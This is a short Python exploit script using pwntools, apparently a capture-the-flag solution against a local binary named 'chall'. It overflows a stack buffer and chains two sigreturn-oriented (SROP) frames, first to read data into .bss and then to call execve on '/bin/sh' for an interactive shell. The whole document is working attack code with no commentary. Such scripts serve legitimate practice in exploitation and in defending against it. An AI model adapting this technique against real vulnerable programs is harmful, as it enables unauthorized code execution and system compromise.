from pwn import *

exe = ELF("./chall")
context.binary = exe

if args.GDB:
	r = gdb.debug("./chall", """
		c
	""")
else:
	r = process("./chall")

syscall = 0x401199
pop_rax = 0x4011a4

frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_read
frame.rdi = 0x0
frame.rsi = exe.bss()
frame.rdx = 0x1000
frame.rsp = exe.bss() + 0x10
frame.rip = exe.plt.read

payload = b"A" * 0x48
payload += flat([
	pop_rax,
	0xf,
	syscall
])
payload += bytes(frame)
r.send(payload)

frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_execve
frame.rdi = exe.bss()
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = exe.bss() + 0x20
frame.rip = syscall

payload = b"/bin/sh".ljust(0x10, b"\x00")
payload += flat([
	pop_rax,
	0xf,
	syscall
])
payload += bytes(frame)
sleep(1)
r.send(payload)

r.interactive()
